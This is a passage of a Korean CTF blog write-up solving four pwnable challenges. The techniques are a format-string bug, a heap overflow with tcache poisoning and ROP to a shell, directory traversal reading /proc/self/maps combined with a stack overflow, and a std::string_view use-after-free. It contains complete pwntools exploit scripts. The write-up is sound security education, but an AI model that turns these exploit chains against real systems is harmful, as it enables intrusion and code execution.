    else:
        C._puts(str(b'Only students of Information Security can read the flag.'))
```

우리의 승리 조건은 다음과 같이 major를 `Economics`에서 `InformationSecurity`로 변경하는 것이다.

```py
from ctypes import *
import sys

C = CDLL('./link.so')

str = c_char_p
dbg_print = print
print = C.print
input_str = lambda x, l: C.input(str(f'%{l-1}s'.encode()), x)
input_ord = lambda x: C.input(str(b'%d'), x)

string = create_string_buffer
age = c_uint(0)
logo = b'''
 _   _ ____  ______   _______ _   _  ___  _   _    __     _     
| | | / ___||  _ \ \ / /_   _| | | |/ _ \| \ | |  / _|___| |__  
| |_| \___ \| |_) \ V /  | | | |_| | | | |  \| | | |_/ __| '_ \ 
|  _  |___) |  __/ | |   | | |  _  | |_| | |\  | |  _\__ \ |_) |
|_| |_|____/|_|    |_|   |_| |_| |_|\___/|_| \_| |_| |___/_.__/ 
               | | ___  ___| |_ _   _ _ __ ___                                 
               | |/ _ \/ __| __| | | | '__/ _ \                                
               | |  __/ (__| |_| |_| | | |  __/                                
               |_|\___|\___|\__|\__,_|_|  \___|                                
'''
flag = False

name = string(b'', 32)
major = string(b'Economics', 32)
```

시작 코드를 보면 모든 입출력을 C언어의 함수들로 대체하는 걸 알 수 있다. 그리고 major는 한 번 지정된 이후로 변경되지 않는다.

즉, 취약점을 악용하여 major를 변경해야만 한다는 뜻이다.

```py
def do_hack():
    global flag
    if flag:
        C._puts(str(b'You only can aaw one time.'))
    else:
        target = c_uint64(0)
        C._puts(str(b'target: '))
        C.scanf(str(b'%ld'), byref(target))
        C._puts(str(b'value: '))
        C.scanf(str(b'%ld'), target)
        flag = True
```

```py
def change_name():
    print(str(b'change change! >'), c_void_p(0), 1)
    C._puts(str(b''))
    input_str(name, 32)
    print(str(b'name is change!\n'), c_void_p(0), 1)
    print(str(b'changed name: '), c_void_p(0), 1)
    print(name, c_void_p(0), 1)
    C._puts(str(b''))
```

문제의 description과 같이 do_hack 함수에서는 1회의 arbitrary address write를 진행할 수 있게끔 도와주며, `change_name` 함수에서 fsb가 발생하는 것을 쉽게 찾아낼 수 있다.

이 문제에는 세 가지 난관이 있다.
첫 째로, arbitrary address write는 8bytes로 단 1회이기 때문에, 주소를 알더라도 aaw를 통해서 `Economics -> InformationSecurity`로 바꿔주는 것은 불가능하다는 것이다.
둘 째로는 어떤 주소가 필요한지 애매하다. libc leak을 한다고 해도 aaw 1회로 shell을 획득하는 건 사실상 불가능하다. 
그리고 마지막으로는 fsb를 진행할 때, 우리가 적는 버퍼의 값이 stack에 적히는 것이 아니라서 굉장히 많은 회수의 stage를 거쳐 fsb를 진행 하거나 해야하는데 이는 굉장히 어려운 문제이다.

하지만 우리는 fsb로 주소값은 몇 번이고 leak을 할 수 있다.

이를 통해 fsb로 name의 실제 주소를 leak하는 건 가능하다. printf가 진행될 때 어쨌던 간에 내부적으로 나의 input(name)을 stack에 담을 가능성이 높기 때문에, gdb로 스택을 조금만 뒤져보면 쉽게 찾아낼 수 있다.

또한 name과 major는 script 내에서 생성 시기가 비슷하기 때문에, name의 주소로 major의 주소도 구해낼 수 있다.

그러나 이것만 가지고는 major를 변조할 수 없다.

major의 주소가 stack에 있는 것도 아니고 stack을 쉽게 변조할 수 있는 것도 아니기 때문이다.

그래서 실제 name의 주소를 가지고 있는 이중 포인터를 찾아내야 한다. (ptr->name->"YOUR NAME"일 때 ptr을 찾아내야 한다.)
name을 직접 접근해서 값을 변조할리는 만무하므로 반드시 pointer가 존재하는데, 이 포인터와 name의 주소는 조금의 오차가 있긴 하지만 매우 reliable하게 비슷한 위치에 존재한다.

때문에 이를 통해서 name의 ptr도 구해낼 수 있다.

이제 aaw기능을 활용하여 name의 ptr에 접근해서 name의 값을 지우고 major의 실제 주소를 넣어주면 name과 major가 같은 주소를 공유하게 된다.

이후에는 change name 기능을 통해 이름을 `InformationSecurity`로 바꿔주면 major도 함께 바뀌게 되므로 승리 조건을 달성할 수 있다.

```python
from pwn import *

e = ELF('/usr/bin/python3')
# p = e.process(['prob.py'])
p = remote('0', 51254)

sla = p.sendlineafter
sa = p.sendlineafter

sla(b'>', b'ipwning')
sla(b'>', b'1')

p.recvuntil(b'6. exit')
sla(b'======================\n', b'3')
pause()
sla(b'>', b'%9$p')
p.recvuntil(b'changed name: ')
leak = int(p.recvline(), 16)
target = leak + 0x175d60
goal = leak + 0x20

log.info('[LEAK] %#x'%leak)

p.recvuntil(b'6. exit')
sla(b'======================\n', b'4')
sla(b'target:', str(target).encode())
sla(b'value:', str(goal).encode())

p.recvuntil(b'6. exit')
sla(b'======================\n', b'3')
sla(b'>', b'InformationSecurity')

p.recvuntil(b'6. exit')
sla(b'======================\n', b'5')

p.interactive()
```

### 블로그 포스트 작성자의 추가적인 코멘트

custom library를 사용하는 파이썬 스크립트에서 FSB, AAW 취약점을 이용해 푸는 문제입니다. 파이썬 스크립트에서 어렵지 않게 FSB, AAW primitive를 확인하실 수 있는데, 문제는 `major` 변수의 값을 직접적으로 바꿀 수 없다는 것입니다. 이럴 때는 게임해킹 하듯이 메모리에서 원하는 값을 찾아야합니다. [gef](https://github.com/hugsy/gef) 디버거에서 `search-pattern` 명령어로 이름 문자열과, 해당 chunk의 주소를 가지고있는 포인터를 쉽게 찾으실 수 있습니다. 

---

## chachacha

**출제자 책정 난이도**: medium

```cpp
void modify()
{
    uint32_t idx;

    cout << "idx: ";
    cin >> idx;

    if(idx >= 0x10) {
        cout << "** Out of bound detected!! **\n" << endl;
        return;
    }
    
    if(!pool[idx]) {
        cout << "not allocated." << endl;
        return;
    }

    uint32_t size;
    
    cout << "size: ";
    cin >> size;

    if (size > 0x1000) {
        cout << "Size is too big!!" << endl;
        return;
    }

    cout << "content: ";
    cin.read(pool[idx], size);
}
```

위 코드를 보면, 이미 할당한 heap에 대한 data를 수정할 수 있다.
그런데, modify를 진행할 때 size에 대한 검증이 없다. 때문에, 바로 heap overflow가 발생한다.

그러면 그냥 익스하면 되지 않나요? 싶지만...

```cpp
void delete_func() 
{
    cout << "not implemented.\n" << endl;
}
```

free가 구현되어 있지 않은 리소스 낭비를 제대로 하는 문제다.

이 때문에 overflow가 발생하더라도 어떻게 exploit을 할지가 매우 애매하다.

우리는 exploit을 위해 glibc에서 ptmalloc의 구현을 알아야 한다. (코드는 직접 읽어보길 권장)

ptmalloc의 구현상, top chunk보다 할당해주려 하는 heap size가 더 크면, 즉, 할당된 heap 공간을 모두 사용하게 되어버리면 이미 할당된 힙 세그먼트 공간을 추가로 확장하고 새로 확장된 공간부터 heap chunk들을 새로 할당하기 시작한다.

이렇게 되는 과정 중에서 top chunk가 free되게 되는데, 우리는 이 점을 통해 freed chunk를 만들어줄 수 있다.

exploit은 아래의 과정을 통해 진행할 수 있다.

1. overflow를 통해 top chunk를 적절히 free시키고 싶은 size로 변조 (이 때, 설정하려 하는 size와 기존의 top chunk의 하위 1.5byte가 달라지면 raise가 발생한다.)
2. 적절히 변조한 top chunk보다 더 큰 size의 heap을 생성
3. 위를 적절히 반복해서 tcache bin chain을 생성
4. unsorted bin으로 들어가는 size의 free도 진행
5. overflow를 통해 libc address(address of main arena)가 있는 곳까지 data를 이어붙여서 libc leak
6. 같은 방법으로 heap도 leak (tcache bin에서의 fd를 encoding하기 위해 필요한 과정)
7. 이제 tcache bin의 fd를 수정하여 aaw, aar을 획득.
8. 이후에는 적절히.. exploit..

개인적으로 출제자는 reliable한 exploit을 좋아해서 environ을 통해 stack을 leak하고 return address를 덮어씌우는 것을 좋아합니다.

```python
from pwn import *

e = ELF('./prob')

# p = e.process(aslr=False)
p = remote('0', 51253)

sla = p.sendlineafter
sa = p.sendafter

def new(size, buf):
    sla(b'> ', b'1')
    sla(b': ', str(size).encode() + buf)

def delete():
    sla(b'> ', b'2')

def cout(idx):
    sla(b'> ', b'3')
    sla(b': ', str(idx).encode())

def modify(idx, size, buf):
    sla(b'> ', b'4')
    sla(b': ', str(idx).encode())
    sla(b': ', str(size).encode() + buf)

def encode(val, xor):
  val = (val ^ (xor >> 12))
  return val

new(0x10, b'A'*0x10) # 0
modify(0, 0x20, p64(0)*3 + p64(0x141))

new(0x200, b'A'*0x200) # 1
modify(0, 0x20, b'A'*0x20)

cout(0)
p.recvuntil(b'A'*0x20)
heap = (u64(p.recv(5) + b'\0\0\0') << 12) - 0x1000

log.info('[HEAP] %#x'%heap)

new(0xca0, b'A'*0xca0) # 2
modify(2, 0xcb0, b'A'*0xca0 + p64(0) + p64(0x141))
new(0x200, b'A'*0x200) # 3

new(0xcc0, b'A'*0xcc0) # 4
modify(4, 0xcd0, b'A'*0xcc0 + p64(0) + p64(0x121))
new(0x200, b'A'*0x200) # 5

new(0xcc0, b'A'*0xcc0) # 6
modify(6, 0xcd0, b'A'*0xcc0 + p64(0) + p64(0x121))
new(0x200, b'A'*0x200) # 7

modify(7, 0x210, b'A'*0x200 + p64(0) + p64(0xdf1))

new(0x1000, b'A'*0x1000) # 8
modify(7, 0x210, b'A'*0x210)

cout(7)
p.recvuntil(b'A'*0x210)
libc = u64(p.recv(6) + b'\0\0') - 0x219ce0
environ = libc + 0x221200
system = libc + 0x50d60
binsh = libc + 0x1d8698
prdi = libc + 0x001718bb

log.info('[GLIBC] %#x'%libc)

modify(6, 0xcd8, b'A'*0xcc0 + p64(0) + p64(0x101) + p64(encode(environ - 0xf0, heap + 0x55000)))
new(0xf0, b'A'*0xf0) # 9
new(0xf0, b'A'*0xf0) # 10

cout(10)
p.recvuntil(b'A'*0xf0)
stack = u64(p.recv(6) + b'\0\0') - 0x120
log.info('[STACK] %#x'%stack)

modify(10, 0xf0, b'\0'*0xf0)

modify(2, 0xcb8, b'A'*0xca0 + p64(0) + p64(0x121) + p64(encode(stack - 8, heap + 0x11000)))

rop = b'A'*8
rop += p64(prdi+1) + p64(prdi) + p64(binsh) + p64(system)
rop = rop.ljust(0x110, b'\0')

new(0x110, b'B'*0x110) # 11
new(0x110, rop) # 12

p.interactive()
```

### 블로그 포스트 작성자의 추가적인 코멘트

HEAP overflow 와 sysmalloc 트릭을 사용하는 문제입니다. 힙 익스플로잇의 경우, 여러 writeup을 읽거나 직접 소스코드를 읽으며 여러 기법들을 참고하면서 공부할 수 있는데, 개인적으로 shellphish 팀의 [how2heap](https://github.com/shellphish/how2heap) 깃허브를 추천드립니다. glibc 버전별로 사용할 수 있는 공격기법을 정리해놓아서 CTF할떄 유용하게 참고하실 수 있습니다. 

이 문제에서 사용하는 트릭의경우 [sysmalloc_int_free](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/sysmalloc_int_free.c) 여기서 확인하실 수 있고, 위 익스플로잇 코드에서 사용하는 `encode` 함수의 정체도 [decrypt_safe_linking](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/decrypt_safe_linking.c) 여기서 관련 정보를 확인하실 수 있습니다. 

---

## HSpace Hub

**출제자 책정 난이도**: medium

먼저 로그인을 하지 않으면 /login.html 페이지로 돌아가기 때문에 회원가입 및 로그인을 수행한다.

로그인을 수행하면 고양이 사진이 여러 장 있는 갤러리가 보인다.

로그인 이후 directory traversal 공격을 시도하면 취약점이 존재하는 것을 확인할 수 있다.

`GET /server` 수행하여 서버 바이너리를 다운로드 할 수 있고 (for_user에 서버 바이너리 이름 적혀있음)
`GET /../../../../../../../proc/self/maps` 수행 시 메모리 leak을 할 수 있다.

바이너리를 분석하면 id와 password를 받는 과정에서 overflow가 발생하는 것을 확인할 수 있다.
```c++
    // id와 password 추출
    char id[10], password[10];
    sscanf(body, "id=%9[^&]&pw=%90s", id, password);
```
아마 9를 입력해야 하는 것을 90을 입력해버린 모양이다.

그 다음으로 POST로 `/magic1337`에 요청을 보내면 굉장히 수상한 동작을 수행하는 것을 확인할 수 있다.
```c++
    else if (strstr(buffer, "POST /magic1337")) {
        body = strstr(buffer, "\r\n\r\n") + 4;

        if (strstr(body, "&location=") != NULL) {
            int spell;
            sscanf(strstr(body, "&location="), "&location=%d", &spell);
            
            if (strstr(body, "&spell=") != NULL) {
                memcpy((char*)(&spell) + spell, strstr(body, "&spell=") + 7, 50);
                char *response = "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nMagic Happend :)";
                write(sock, response, strlen(response));
            } else {
                char *response = "HTTP/1.1 400 Bad Request\nContent-Type: text/plain\n\nYou are not magician :(";
                write(sock, response, strlen(response));
            }
        } else {
            char *response = "HTTP/1.1 400 Bad Request\nContent-Type: text/plain\n\nYou are not magician :(";
            write(sock, response, strlen(response));
        }
    }
```
여기서 location과 spell이라는 값을 받아서 location만큼 떨어진 주소에 spell 값을 write 할 수 있다.

즉 offset base로 stack에 임의의 50bytes를 작성할 수 있다.

앞에서 password에서 overflow가 발생하지만 sscanf로 저장하기 때문에 null btye는 포함되지 않는다. 그리고 끝에 null byte가 들어간다.
하지만 기가막히가 90바이트를 꽉 채워서 입력하면 정확하게 ret의 6bytes를 수정할 수 있게 된다. 그렇기에 ret 명령어 중 0x00~0x1f가 포함되지 않은 주소에 있는 곳으로 ret을 덮고 그 이후에 spell에 rop payload를 담아 ret+8 주소에 작성되도록 location을 조정하면 exploit이 가능하다.

이때 flag는 전역변수에 저장되기 때문에 pie base를 안다면 쉽게 값을 알 수 있다.

exploit code는 다음과 같다.
```python
from pwn import *

context.log_level = 'debug'

p = remote('3.34.190.217', '8003')

pause()

libc_base = int(input('Input libc base address: '), 16)
pie_base = int(input('Input pie base address: '), 16)
fd = int(input('Input fd: '))

flag = pie_base + 0x5040
ret = pie_base + 0x1e27

poprdi = libc_base + 0x2a3e5
poprsi = libc_base + 0x141d5e
poprsi2 = libc_base + 0x2a3e3

#libc_write = libc_base + 0x114870 + 0x1b0
libc_write = libc_base + 0x114680

payload = p64(poprdi)
payload += p64(fd)
payload += p64(poprsi2)
payload += p64(flag)
payload += p64(0)
payload += p64(libc_write)

p.send(b'POST /magic1337 HTTP/1.1\r\nCookie: id=asdf\r\n\r\nid=aaaa&pw=' + b'b'*84 + p64(ret)[0:6] + b'&location=96&spell=' + payload)

p.interactive()
```

exploit에서 올바른 fd를 입력하기 위해서 `GET /../../../../../../../proc/self/fdinfo/{fd}` 를 통해 4~ 이후의 fd부터 conntection이 연결되어 open 된 fd 번호를 찾아 해당 값을 넣으면 flag를 받아올 수 있다.

### 블로그 포스트 작성자의 추가적인 코멘트

C 언어로 구현된 웹 서버에서 LFI, BOF 취약점을 이용해 푸는 문제입니다. 이 문제는 릭을 할 때 서버의 파일에 접근해 릭을 해와야 합니다. 메모리 매핑에 대한 정보는 `/proc/self/maps` 파일에서 확인하실 수 있습니다. 해당 파일에는 라이브러리, 바이너리, 스택, 힙의 베이스주소와 권한에 대한 정보를 담고 있습니다. 이를 이용해 라이브러리의 가젯들을 사용할 수 있습니다. 

또한, 전역변수에 저장된 플래그를 읽어 소켓으로 보낼 때, 요청 별로 FD 가 할당되기 때문에 `/proc/self/fdinfo/<fd>` 파일을 읽어 다음에 할당될 FD 번호를 알아내야합니다. 보통 LFI 취약점을 이용할 때 `/proc` 파일 시스템에서 유용한 정보를 얻을 수 있으니 [여기](https://docs.kernel.org/filesystems/proc.html)에서 어떤 파일들이 있고, 각각 어떤 내용을 담고있는지 살펴보시는것을 추천드립니다. 

---

## InSecureCPP

**출제자 책정 난이도**: hard

std::string_view는 C++17에 출시됐지만 이후 버전에서는 사용하려고 하면 오류가 발생합니다. 아주 치명적인 이유가 발생했는데 구현체 내부에서 use-after-free(https://github.com/isocpp/CppCoreGuidelines/issues/1038) 가 발생합니다. 
컴파일시 --std=c++17 옵션을 주지 않으면 `insecurecpp.cpp:115:19: note: ‘std::string_view’ is only available from C++17 onwards` 에러가 발생합니다.

인텐상으로 다음 코드에는 2~3가지의 취약점이 존재합니다. 메모리를 delete할 때 발생하는 UAF와 vtable을 이용하는 방법, 그리고 위에서 이야기한 string_view UAF를 이용하는 방법 이렇게 존재합니다. 사실 여러 취약점이 있기 때문에 원하는 취약점을 이용해서 exploit을 하면 됩니다.

string_view에서 다음 코드를 작성하면 segment fault가 발생합니다.
```cpp
#include <iostream>
#include <string>
#include <string_view>

int main() {
  std::string s = "Hellooooooooooooooo ";
  std::string_view sv = s + "World\n";
  std::cout << sv;
}
```

이를 응용해서 코드를 보면 다음과 같습니다.
id,pw를 파싱하는 부분인데 return 되면 string_view들은 소멸됩니다.
```cpp
auto splitToken(string_view str, string_view delim)
{
    if (!allow_admin && str.find("root") != str.npos){
        cout << "Access denied" << endl;
        exit(-1);
    }
    vector<string_view> res;

    // push_back 등 생략

    return res;
}
```

하지만 return된 res를 `auto [user, pw] = handler();` 다음처럼 user, pw로 받습니다. 이후 입력을 하면 어디에 값이 써질까요? 바로 user에 값이 써집니다. std::string은 입력 크기에 따라 heap에 할당되므로 UAF를 악용할 수 있습니다.

코드를 확인해보면 바로 handler() 이후 token을 입력받는데 여기서 getInput()은 마침 string을 getline로 받으니 heap에 할당되어 UAF 악용이 가능합니다.
```cpp
void login(){
    auto [user, pw] = handler();

    std::cout << "Token : ";
    auto token = getInput();
    if(token.find("@HSPACE@") == string::npos){
        cout << "Invalid Token" << endl;
        return;
    }

    if (auto it = handle_admin.find(user); it != handle_admin.end()){
        it->second(pw);
    }
    else{
        handle_guest(pw);
    }
}
```

```python
from pwn import *

# context.log_level = 'debug'
# e = ELF('./insecurecpp')
# p = e.process()
p = remote('3.34.190.217',15823)

p.sendlineafter(b'>> ', b'0')
idpw = b'aaaa&'+b'a'*32
p.sendlineafter(b'Enter ID&PW : ', idpw)

real = b'root'+b'@HSPACE@'+b'a'*25
p.sendlineafter(b'Token : ', real)

p.interactive()
```


### 블로그 포스트 작성자의 추가적인 코멘트

C++ library HEAP 트릭을 이용한 문제입니다. `string_view vulnerability` 라고 검색했을 때 뜨는 [깃허브 이슈](https://github.com/isocpp/CppCoreGuidelines/issues/1038)를 확인한다면 쉽게 풀 수 있지만 사실 standard library 에서 취약점이 발생할 수 있다는 사실을 떠올리기는 쉽지 않을 수 있습니다. 하지만 Pormat_string_bug 문제와 마찬가지로 디버거를 이용해 힙이 할당되고 재사용되는 과정을 추적한다면 UAF가 발생한다는 단서를 찾으실 수 있을 것입니다.  

---

이번 블로그에서는 총 10문제의 포너블 문제를 풀이해 봤습니다. 이번 문제들도 [HSpace Wargame](https://chall.hspace.io) 사이트에서 풀 수 있으니 직접 디버깅해보며 익스플로잇 코드를 작성해보시는 것을 추천드립니다. 도움이 되셨다면 주변에 널리 홍보 부탁드리겠습니다~! 

---

